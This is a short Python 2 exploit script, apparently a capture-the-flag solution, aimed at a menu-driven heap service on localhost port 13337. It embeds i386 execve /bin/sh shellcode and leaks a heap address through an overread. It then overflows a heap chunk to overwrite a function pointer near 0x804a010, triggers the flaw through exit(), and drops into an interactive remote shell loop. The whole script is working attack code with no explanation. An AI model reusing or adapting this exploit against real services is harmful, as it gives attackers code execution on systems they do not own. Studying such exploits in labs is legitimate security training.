#!/usr/bin/env python

import socket
import struct
import time
import sys
import pwn

# 23bit classic /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"

def send(s, msg):
    s.send(msg)
    time.sleep(.25)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 13337))

time.sleep(.50)

send(s, "1\n10\n")
send(s, "1\n10\n")
send(s, "3\n0\n16\n")
send(s, 16*"A")
send(s, "4\n0\n")
buf = s.recv(1024)
idx = buf.find('A'*16) + 16
heap = struct.unpack('<L', buf[idx:idx+4])[0]
print( '\033[0;32m[+] Heap address : %s' % hex(heap))
send(s, "3\n0\n1337\n")

print( '[+] Sending payload')
send(s, 16*'A' + struct.pack('<L', heap) + struct.pack('<L', 0x804a010 - 4) + '\x90'*(16+4+4+1) + shellcode)

raw_input("Continue? " )
print( '[+] Corrupting (again) second chunk')
send(s, "2\n1\n")

print( '[+] Triggering vuln')
send(s, "1337\n")  # Invalid choice, this will call exit(3)
s.recv(1024)

print( '[+] shell!\033[0m')
while 1:
    s.send(raw_input('\033[1;31m$ \033[0m') + '\n')
    print s.recv(1024)

